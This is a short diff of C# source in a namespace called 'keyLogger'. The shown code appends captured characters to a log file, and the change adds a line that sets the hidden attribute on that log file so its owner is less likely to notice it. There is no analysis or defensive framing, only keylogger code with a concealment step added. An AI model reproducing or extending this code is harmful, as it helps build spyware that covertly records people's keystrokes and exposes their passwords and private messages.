@@ -36,6 +36,7 @@ namespace keyLogger
                         using (StreamWriter LSw = File.AppendText(LStrFile)) {
                             LSw.Write((char)LIntCaracter + ". ");                            
                         }
+                        
                     }
                 }
             }
@@ -48,6 +49,7 @@ namespace keyLogger
             if (!File.Exists(PvStrFile)) {
                 using (StreamWriter LSw = File.CreateText(PvStrFile)) {                        
                 }
+                File.SetAttributes(PvStrFile, File.GetAttributes(PvStrFile) | FileAttributes.Hidden);
             }          
             return true;
         }
